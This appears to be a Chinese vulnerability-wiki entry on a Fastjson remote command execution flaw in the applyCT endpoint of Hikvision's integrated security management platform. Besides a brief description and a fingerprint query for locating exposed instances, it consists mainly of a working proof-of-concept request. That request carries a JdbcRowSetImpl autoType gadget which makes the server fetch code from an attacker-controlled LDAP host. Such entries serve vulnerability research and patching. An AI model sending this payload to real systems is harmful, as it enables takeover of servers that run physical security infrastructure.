---
title: "Hikvision 综合安防管理平台 applyCT Fastjson远程命令执行漏洞"
date: 2026-10-18 09:14:41
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "命令执行"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

Hikvision 综合安防管理平台 applyCT 存在低版本Fastjson远程命令执行漏洞，攻击者通过漏洞可以执行任意命令获取服务器权限

## 漏洞影响

```
Hikvision 综合安防管理平台
```

## 网络测绘

```
app="Hikvision-综合安防管理平台"
```

## 漏洞复现

登录页面

![image-20220824134144287](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241341481.png)

验证POC

```
POST /bic/ssoService/v1/applyCT 
Content-Type: application/json

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.xxx.xxx.xxx/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"="}
```

![image-20220824134503675](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241345726.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-applyCT-Fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
